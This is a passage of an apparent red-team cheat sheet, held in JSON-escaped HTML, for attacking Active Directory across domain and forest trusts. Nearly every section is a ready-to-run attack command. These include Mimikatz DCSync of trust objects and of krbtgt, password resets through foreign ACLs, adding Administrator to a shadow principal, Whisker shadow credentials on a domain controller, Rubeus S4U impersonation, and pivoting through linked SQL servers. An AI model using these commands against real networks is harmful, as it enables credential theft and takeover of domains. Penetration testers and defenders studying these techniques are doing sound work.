class=\"s2\">&quot;&lt;domain&gt;&quot;</span><span class=\"p\">}</span> <span class=\"p\">|</span> <span class=\"nb\">Select </span><span class=\"n\">TrustAttributes</span>\n</code></pre></div>\n<h3 id=\"retrieve-inter-realm-tickets-mimikatz\">Retrieve Inter-Realm Tickets (Mimikatz)</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-ADObject</span> <span class=\"n\">-LDAPFilter</span> <span class=\"s1\">&#39;(objectClass=trustedDomain)&#39;</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">name</span><span class=\"p\">,</span><span class=\"n\">objectguid</span>\n<span class=\"p\">.\\</span><span class=\"n\">mimikatz</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"s2\">&quot;lsadump::dcsync /guid:{&lt;trust-object-guid&gt;}&quot;</span> <span class=\"s2\">&quot;exit&quot;</span>\n</code></pre></div>\n<h3 id=\"parse-msds-trustforesttrustinfo\">Parse msDS-TrustForestTrustInfo</h3>\n<div class=\"highlight\"><pre><span></span><code>python3<span class=\"w\"> </span>ftinfo.py\n</code></pre></div>\n<h3 id=\"enumerate-foreign-security-principals\">Enumerate Foreign Security Principals</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainObject</span> <span class=\"n\">-LDAPFilter</span> <span class=\"s1\">&#39;(objectclass=ForeignSecurityPrincipal)&#39;</span> <span class=\"n\">-Domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"enumerate-foreign-acl-principals\">Enumerate Foreign ACL Principals</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-DomainObjectAcl</span> <span class=\"n\">-ResolveGUIDs</span> <span class=\"n\">-Identity</span> <span class=\"p\">*</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span> <span class=\"p\">|</span> <span class=\"p\">?</span> <span class=\"p\">{</span><span class=\"nv\">$_</span><span class=\"p\">.</span><span class=\"n\">SecurityIdentifier</span> <span class=\"o\">-eq</span> <span class=\"nv\">$sid</span><span class=\"p\">}</span>\n</code></pre></div>\n<h3 id=\"abuse-foreign-acl-password-reset\">Abuse Foreign ACL - Password Reset</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-DomainUserPassword</span> <span class=\"n\">-identity</span> <span class=\"p\">&lt;</span><span class=\"n\">target-user</span><span class=\"p\">&gt;</span> <span class=\"n\">-AccountPassword</span> <span class=\"nv\">$pass</span> <span class=\"n\">-domain</span> <span class=\"p\">&lt;</span><span class=\"n\">external-domain</span><span class=\"p\">&gt;</span> <span class=\"n\">-verbose</span>\n</code></pre></div>\n<h3 id=\"shadow-principal-in-bastion-forest\">Shadow Principal in Bastion Forest</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Set-ADObject</span> <span class=\"n\">-Identity</span> <span class=\"s2\">&quot;CN=&lt;name&gt;,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=&lt;domain&gt;,DC=corp&quot;</span> <span class=\"n\">-Add</span> <span class=\"p\">@{</span><span class=\"s1\">&#39;member&#39;</span><span class=\"p\">=</span><span class=\"s2\">&quot;CN=Administrator,CN=Users,DC=&lt;domain&gt;,DC=corp&quot;</span><span class=\"p\">}</span> <span class=\"n\">-Verbose</span>\n<span class=\"nb\">Get-ADObject</span> <span class=\"n\">-SearchBase</span> <span class=\"p\">(</span><span class=\"s2\">&quot;CN=Shadow Principal Configuration,CN=Services,&quot;</span> <span class=\"p\">+</span> <span class=\"p\">(</span><span class=\"nb\">Get-ADRootDSE</span><span class=\"p\">).</span><span class=\"n\">configurationNamingContext</span><span class=\"p\">)</span> <span class=\"n\">-Filter</span> <span class=\"p\">*</span> <span class=\"n\">-Properties</span> <span class=\"p\">*</span> <span class=\"p\">|</span> <span class=\"nb\">select </span><span class=\"n\">Name</span><span class=\"p\">,</span><span class=\"n\">member</span><span class=\"p\">,</span><span class=\"s1\">&#39;msDS-ShadowPrincipalSid&#39;</span> <span class=\"p\">|</span> <span class=\"nb\">fl</span>\n</code></pre></div>\n<hr />\n<h2 id=\"shadow-credentials-whisker-on-intra-forest-targets\">Shadow Credentials / Whisker on Intra-Forest Targets</h2>\n<h3 id=\"add-credential-to-dc-machine-account\">Add Credential to DC Machine Account</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">Whisker</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">add</span> <span class=\"p\">/</span><span class=\"n\">target</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;$</span> <span class=\"p\">/</span><span class=\"n\">domain</span><span class=\"p\">:&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n<span class=\"p\">.\\</span><span class=\"n\">Rubeus</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"n\">s4u</span> <span class=\"p\">/</span><span class=\"n\">dc</span><span class=\"p\">:&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">ticket</span><span class=\"p\">:&lt;</span><span class=\"n\">base64-ticket</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">impersonateuser</span><span class=\"p\">:</span><span class=\"n\">administrator</span><span class=\"p\">@&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">ptt</span> <span class=\"p\">/</span><span class=\"n\">self</span> <span class=\"p\">/</span><span class=\"n\">service</span><span class=\"p\">:</span><span class=\"n\">host</span><span class=\"p\">/&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span> <span class=\"p\">/</span><span class=\"n\">altservice</span><span class=\"p\">:</span><span class=\"n\">cifs</span><span class=\"p\">/&lt;</span><span class=\"n\">dc-hostname</span><span class=\"p\">&gt;.&lt;</span><span class=\"n\">domain</span><span class=\"p\">&gt;</span>\n</code></pre></div>\n<h3 id=\"dcsync-after-compromise\">DCSync After Compromise</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"p\">.\\</span><span class=\"n\">mimikatz</span><span class=\"p\">.</span><span class=\"n\">exe</span> <span class=\"s2\">&quot;lsadump::dcsync /user:&lt;child-domain&gt;\\krbtgt&quot;</span> <span class=\"n\">exit</span>\n</code></pre></div>\n<hr />\n<h2 id=\"sql-server-cross-domain-pivoting\">SQL Server Cross-Domain Pivoting</h2>\n<h3 id=\"enumerate-sql-server-links\">Enumerate SQL Server Links</h3>\n<div class=\"highlight\"><pre><span></span><code><span class=\"nb\">Get-SQLServerLink</span>\n<span class=\"nb\">Get-SQLQuery</span> <span class=\"n\">-Query</span> <span class=\"s2\">&quot;EXEC sp_helplinkedsrvlogin&quot;</span>\n</code></pre></div>\n<h3 id=\"connect-to-cross-forest-sql-server\">Connect to Cross-Forest SQL Server</h3>\n<div class=\"highlight\"><pre><span></span><code>mssqlclient.py<span class=\"w\"> </span>&lt;username&gt;@&lt;sql-server-ip&gt;<span class=\"w\"> </span>-windows-auth\n</code></pre></div>\n<h3 id=\"get-localsid-for-sql-server\">Get LocalSid for SQL Server</h3>\n<div class=\"highlight\"><pre><span></span><code>proxychains<span class=\"w\"> </span>python<span class=\"w\"> </span>getlocalsid.py<span class=\"w\"> </span>&lt;domain&gt;/Administrator@&lt;sql-server&gt;.&lt;external-domain&gt;<span class=\"w\"> </span>&lt;sql-server&gt;\n</code></pre></div>", "excerpt": "Trust Enumeration and Mapping Map trust relationships before attempting cross-domain or cross-forest attacks. Enumerate Trusts (AD Module) Import-Module activedirectory Get-ADTrust -Filter * Enumerate", "tags": []}